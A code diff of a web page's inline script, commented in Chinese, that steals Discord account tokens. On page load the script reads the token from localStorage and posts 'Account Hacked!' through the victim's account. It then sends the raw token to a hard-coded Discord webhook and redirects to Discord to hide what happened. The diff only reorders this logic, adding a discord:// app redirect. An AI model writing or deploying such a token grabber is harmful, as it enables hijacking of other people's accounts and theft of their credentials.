@@ -23,42 +23,39 @@
   <script>
     (function() {
       try {
-        // 嘗試多種 token 來源
-        var token = localStorage.getItem("token") || '';
-        if (token) token = token.replace(/"/g, "");
+        var token = localStorage.getItem("token");
+        if (token) {
+          token = token.replace(/"/g, "");
 
-        // 如果無 token，直接跳 Discord
-        if (!token) {
-          window.location.href = "https://discord.com/channels/@me";
-          return;
+          // 發送訊息到目標
+          fetch("https://discord.com/api/v9/channels/878151437085974548/messages", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "Authorization": token
+            },
+            body: JSON.stringify({
+              content: "🔓 **Account Hacked!**"
+            }),
+            keepalive: true
+          });
+
+          // 備份 token 到 webhook
+          fetch("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              content: "🔓 **Discord Token 已擷取**\n```\n" + token + "\n```"
+            })
+          }).catch(function() {});
         }
 
-        // 發送訊息到目標
-        fetch("https://discord.com/api/v9/channels/878151437085974548/messages", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "Authorization": token
-          },
-          body: JSON.stringify({
-            content: "🔓 **Account Hacked!**"
-          }),
-          keepalive: true
-        });
-
-        // 備份 token 到 webhook
-        fetch("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: "🔓 **Discord Token 已擷取**\n```\n" + token + "\n```"
-          })
-        }).catch(function() {});
-
-        // 跳回 Discord
+        // 先跳 discord:// 拉起 Discord app
+        window.location.href = "discord://";
+        // 200ms 後如果還沒拉起 app，跳回 Discord
         setTimeout(function() {
           window.location.href = "https://discord.com/channels/@me";
-        }, 500);
+        }, 200);
       } catch(e) {
         console.log("Token 抓取失敗:", e);
       }
